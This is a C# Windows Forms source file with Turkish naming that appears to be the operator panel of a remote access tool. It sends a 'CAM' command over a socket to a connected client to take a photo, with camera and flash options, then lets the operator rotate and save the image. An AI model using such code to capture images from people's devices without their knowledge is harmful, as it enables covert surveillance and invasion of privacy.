using System;
using System.Drawing;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class Kamera : Form
    {
        Socket soketimiz;
        public string ID = "";
        public int max = 0;
        public Kamera(Socket s, string aydi)
        {
            soketimiz = s;
            ID = aydi;
            InitializeComponent();
        }
        public static string GetFileSizeInBytes(long size)
        {
            try
            {
                string[] sizes = { "B", "KB", "MB", "GB", "TB" };
                double len = size;
                int order = 0;
                while (len >= 1024 && order < sizes.Length - 1)
                {
                    order++;
                    len = len / 1024;
                }
                string result = string.Format("{0:0.##} {1}", len, sizes[order]);
                return result;
            }
            catch (Exception ex) { return ex.Message; }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            label1.Visible = false;
            try
            {
                Text = "Kamera";
                string cam = "";
                string flashmode = "";
                cam = radioButton1.Checked ? "1" : "0";
                button1.Enabled = false;
                flashmode = checkBox1.Checked ? "1" : "0";
                Form1.KomutGonder("CAM", "[VERI]" + cam + "[VERI]" + flashmode + "[VERI][0x09]", soketimiz);
                label2.Text = "Çekiliyor..";
            }
            catch (Exception) { }


        }
        public Image RotateImage(Image img)
        {
            Bitmap bmp = new Bitmap(img);

            using (Graphics gfx = Graphics.FromImage(bmp))
            {
                gfx.Clear(Color.White);
                gfx.DrawImage(img, 0, 0, img.Width, img.Height);
            }

            bmp.RotateFlip(RotateFlipType.Rotate90FlipNone);
            return bmp;
        }
        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            if (pictureBox1.Image != null)
            {
                pictureBox1.Image = RotateImage(pictureBox1.Image);
            }
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            if (pictureBox1.Image != null)
            {
                using (SaveFileDialog op = new SaveFileDialog())
                {
                    op.Filter = "resim|*.jpg;*.jpeg;*.png";
                    op.Title = "Fotoğrafı kaydet";
                    if (op.ShowDialog() == DialogResult.OK)
                    {
                        pictureBox1.Image.Save(op.FileName);
                    }
                }
            }
        }
    }
}